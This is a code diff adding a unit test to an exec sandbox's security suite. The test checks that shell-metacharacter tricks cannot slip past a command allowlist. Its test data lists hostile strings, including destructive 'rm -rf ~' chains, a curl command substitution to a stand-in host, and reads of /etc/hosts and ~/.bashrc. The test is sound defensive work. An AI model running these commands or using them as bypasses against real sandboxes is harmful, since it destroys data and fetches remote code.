@@ -105,6 +105,32 @@ class ExecSandboxSecurityTests(unittest.TestCase):
         row = self._read_events()[-1]
         self.assertEqual(row["payload"]["exit_code"], 3)
 
+    def test_read_rejects_shell_metacharacter_bypasses(self) -> None:
+        # Each command would otherwise pass the leading-token allowlist
+        # ("git log", "cat", "ls", "find") and reach _run_in_shell, where
+        # shell=True executes the metachar payload. Pre-check must reject.
+        bypasses = [
+            "git log && rm -rf ~",        # &&  (chain)
+            "git log & rm -rf ~",         # &   (background)
+            "git log ; rm -rf ~",         # ;   (chain)
+            "git log | tee /tmp/x",       # |   (pipe)
+            "cat $(curl evil.test/x)",    # $() (command substitution)
+            "cat `whoami`",               # ``  (backtick substitution)
+            "ls > /tmp/forbidden",        # >   (redirect)
+            "ls < /etc/hosts",            # <   (redirect)
+            "cat (ls)",                   # ()  (subshell)
+            "ls *.py",                    # *   (glob)
+            "cat ?",                      # ?   (glob)
+            "cat [abc]",                  # []  (charclass)
+            "cat {a,b}",                  # {}  (brace expansion)
+            "cat ~/.bashrc",              # ~   (tilde expansion)
+            "ls \\$HOME",                 # \\   (escape)
+        ]
+        for cmd in bypasses:
+            with self.subTest(command=cmd):
+                proc = self._run(scope="read", cmd=cmd)
+                self.assertEqual(proc.returncode, 3, msg=f"metachar bypass not blocked: {cmd!r}")
+
     def test_secret_is_scrubbed_in_event_payload_command(self) -> None:
         secret = "sk-ant-00000000000000000000"
         (self.repo / secret).write_text("secret\n", encoding="utf-8")
